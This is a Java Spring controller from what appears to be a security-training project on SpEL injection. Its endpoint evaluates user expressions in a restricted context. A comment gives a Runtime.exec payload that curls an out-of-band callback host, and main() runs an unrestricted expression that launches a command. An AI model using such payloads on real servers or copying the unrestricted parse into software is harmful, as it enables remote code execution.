package org.joychou.controller;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

import java.util.Collections;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Locked-down context: no type lookup (T(...)/new), no method or constructor invocation,
        // no property/reflective access and no bean references. Only literals and operators evaluate.
        // (SimpleEvaluationContext is not available in the Spring 4.3.6 pinned by this project's Boot parent.)
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        Object value = parser.parseExpression(expression).getValue(context);
        return String.valueOf(value);
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

